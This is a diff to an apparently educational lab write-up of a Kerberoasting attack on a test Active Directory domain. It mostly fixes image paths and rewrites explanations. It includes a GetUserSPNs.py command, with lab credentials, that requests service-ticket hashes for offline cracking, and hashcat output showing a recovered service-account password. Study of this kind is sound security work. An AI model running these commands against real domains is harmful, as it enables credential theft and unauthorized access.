@@ -118,18 +118,18 @@ Information gathered:
 - Domain: READTEAMBD.local
 
 <p align="center">
-  <img src="/writeups/kerbersoting attack/images/step1.png" width="600">
+  <img src="/writeups/06-kerberosting attack/images/step1.png" width="600">
 </p>
 
 
 ## Step 2 – Save Hash to File
 
-After identifying the service ticket, I saved the output into `kerberoast.txt` file for offline cracking.
+After identifying the service account, I requested the Kerberos service ticket again and saved the resulting TGS hash to a file for offline password cracking.
 
 ```bash
 GetUserSPNs.py readteambd.local/rahimkhan:Password1 -dc-ip 192.168.5.134 -request -outputfile kerberoast.txt
 ```
-This file contains the Kerberos TGS hash required for password cracking.
+This command performs the same SPN enumeration as before but also saves the extracted Kerberos TGS hash to `kerberoast.txt` instead of only displaying it on the screen.
 
 ## Step 3 – Crack the Ticket
 
@@ -155,9 +155,10 @@ Hash Mode: 13100 (Kerberos 5, etype 23, TGS-REP)
 Target Account: sqlservice
 Recovered Password: Mypassword123#
 ```
+Hashcat successfully recovered the password for the sqlservice account:
 
 <p align="center">
-  <img src="/writeups/kerbersoting attack/images/step3.png" width="600">
+  <img src="/writeups/06-kerberosting attack/images/step3.png" width="600">
 </p>
 
 ## Why Kerberoasting is Dangerous
